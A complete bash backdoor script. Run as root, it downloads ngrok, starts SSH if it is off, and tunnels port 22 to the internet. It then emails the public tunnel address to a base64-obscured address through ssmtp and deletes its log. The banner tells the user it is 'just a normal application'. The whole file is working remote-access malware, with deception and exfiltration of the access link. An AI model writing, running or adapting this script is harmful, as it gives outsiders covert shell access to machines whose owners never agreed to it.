#! /bin/bash 

dependencies(){
	cd /var/tmp
	printf "Subject: log(s) for the backdoor-script\n\n">>success.log
	printf "$(date): The working directory is $(pwd)\n" >> success.log
	command -v wget > /dev/null || { echo "$(date): I require wget that is not installed :( " >> error.log;exit 1;}
	command -v unzip > /dev/null || { echo "$(date): I require unzip that is not installed" >> error.log; exit 1;}
	test $(id -u) -eq 0 || { printf "\e[1;92m[*_*] $(date): root is required to run the script...\n" >> error.log;exit 1; }
	command -v /usr/sbin/ssmtp > /dev/null || { echo "$(date): I require ssmtp to run" >> error.log; exit 1; }
}

banner(){
	printf "This is just a normal application :)\n"
}

start(){
	if [[ -e ngrok ]]
	then
		printf ""
	else
		printf "$(date): Downloading ngrok...\n" >> success.log
		wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
		if [[ -s ngrok-stable-linux-386.zip ]]
		then
			printf "$(date): Ngrok was downloaded.Unzipping it...\n" >> success.log
			unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
			chmod +x ngrok
			rm -fr ngrok-stable-linux-386.zip > /dev/null 2>&1
		else
			printf "$(date): There was an error donwloading the file...\n" >> error.log
			exit 1
		fi
	fi

	printf "$(date): Checking if SSH is active and running.\n" >> success.log
	command=$(systemctl status ssh | grep Active | cut -d ":" -f 2)
	
	if [[ $command == *"inactive"* ]]
	then
		printf "$(date): SSH is inactive.Starting SSH.\n" >> error.log
		systemctl start ssh > /dev/null 2>&1
	else
		printf ""
	fi
	
	printf "$(date): Starting ngrok server\n" >> success.log
	sleep 30
	./ngrok tcp 22 > /dev/null 2>&1 &
	sleep 90
	link=$(curl -s http://localhost:4040/api/tunnels | jq -r .tunnels[0].public_url | cut -d "/" -f 3)

	echo "$(date): Task done! connect to - ${link}" >> success.log
	/usr/sbin/ssmtp $(echo "ODQyMWdpbGJlcnRyb2JlcnRAZ21haWwuY29tCg==" | base64 -d) < success.log
	rm -fr success.log
}

dependencies
start
